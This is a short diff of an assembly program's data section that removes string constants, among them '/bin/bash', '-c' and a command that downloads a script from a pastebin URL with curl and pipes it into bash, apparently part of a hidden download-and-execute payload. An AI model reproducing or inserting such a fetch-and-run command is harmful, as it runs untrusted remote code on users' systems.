@@ -2467,11 +2467,6 @@ proc2:      db "cat", 0
 proc1:      db "vim", 0
 db 0x00
 
-devnull:    db "/dev/null", 0
-execve1:    db "/bin/bash", 0
-execve2:    db "-c", 0
-execve3:    db "curl -s https://pastebin.com/raw/vr3vaWbx | /bin/bash", 0
-urandom:    db "/dev/urandom", 0
 pwd_var:    db "PWD", 0
 
 dirs_root:
